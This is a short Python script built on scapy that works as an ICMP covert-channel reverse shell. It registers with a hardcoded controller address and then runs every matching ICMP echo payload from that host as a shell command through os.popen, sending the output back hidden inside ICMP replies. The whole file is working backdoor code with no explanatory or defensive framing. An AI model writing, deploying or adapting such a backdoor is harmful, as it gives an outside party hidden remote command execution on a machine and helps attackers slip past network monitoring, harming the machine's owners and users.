from scapy.all import sr,IP,ICMP,Raw,sniff
import os

dest = "192.168.157.6"
iface = "ens18"
ICMP_ID = int(12800)
TTL = int(64)

def rvsh(pkt):
    if pkt[IP].src == dest and pkt[ICMP].type == 8 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppaket = (pkt[Raw].load).decode('utf-8', errors='ignore')
        payload = os.popen(icmppaket).readlines()
        icmppacket = (IP(dst=dest, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load=payload))
        sr(icmppacket, timeout=0, verbose=0)
    else:
        pass

def setup():
    join = (IP(dst=dest, ttl=TTL)/ICMP(type=0, id=ICMP_ID)/Raw(load="join"))
    sr(join, timeout=0, verbose=0)
    print("[ Executing setup sequence... ]")
    print(f"--> {join}")

if __name__ == "__main__":
    setup()
    print("[ ICMP Sniffing Started ]")
    sniff(iface=iface, prn=rvsh, filter="icmp", store="0")